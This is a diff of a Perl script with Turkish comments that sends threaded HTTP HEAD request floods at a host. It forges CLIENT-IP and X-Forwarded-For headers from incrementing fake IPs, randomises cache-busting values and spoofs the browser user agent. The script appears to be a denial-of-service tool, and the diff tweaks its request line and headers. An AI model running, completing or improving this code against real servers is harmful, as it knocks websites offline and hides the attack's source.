@@ -39,12 +39,10 @@ use threads ('yield',
                 'stringify');
 use threads::shared;
 
-my $ua = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"; 
+my $ua = "(Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36)"; 
 my $method = "HEAD";
-my $methodx = "GET"; #
-my $methodz = "POST"; #
 my $hilo;
-my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z','ş','ç','ı',0,1,2,3,4,5,6,7,8,9); #
+my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z','ş',,'ı',0,1,2,3,4,5,6,7,8,9); #
 my $randsemilla = "";
 for($i = 0; $i < 51; $i++) { #Burası @vals daki yazılan harfler 0, 30 arası bir cümle oluşturuyor ex:(abababab) (st3st3tg353tg!)   
     $randsemilla .= $vals[int(rand($#vals))];
@@ -76,7 +74,7 @@ sub sender { # adı üstünde sender
             $ipinicial = $sumador->mas();
             my $filepath = $file;
             $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g; 
-            $paquete .= join "",$method," ",$methodx," ",$methodz," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
+            $paquete .= join "",$method," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
         } # HEAD/ GET /POST ACK ;  #methodx POST #methodz GET
         $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
         print $sock $paquete;
